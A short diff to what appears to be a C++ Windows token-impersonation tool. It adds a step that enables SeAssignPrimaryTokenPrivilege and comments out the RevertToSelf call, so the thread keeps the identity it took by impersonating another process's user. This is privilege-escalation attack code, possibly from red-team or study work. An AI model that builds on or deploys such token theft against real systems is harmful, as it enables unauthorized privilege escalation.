@@ -95,6 +95,12 @@ int main(int argc, char** argv) {
 		printf("[+] SeDebugPrivilege enabled!\n");
 	}
 
+	// Add SE Assign Primary Token privilege
+	if (SetPrivilege(currentTokenHandle, L"SeAssignPrimaryTokenPrivilege", TRUE))
+	{
+		printf("[+] SeAssignPrimaryTokenPrivilege enabled!\n");
+	}
+
 	// Call OpenProcess(), print return code and error code
 	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);
 	if (GetLastError() == NULL)
@@ -121,8 +127,8 @@ int main(int argc, char** argv) {
 	{
 		printf("[+] ImpersonatedLoggedOnUser() success!\n");
 		printf("[+] Current user is: %s\n", (get_username()).c_str());
-		printf("[+] Reverting thread to original user context\n");
-		RevertToSelf();
+		//printf("[+] Reverting thread to original user context\n");
+		//RevertToSelf();
 	}
 	else
 	{
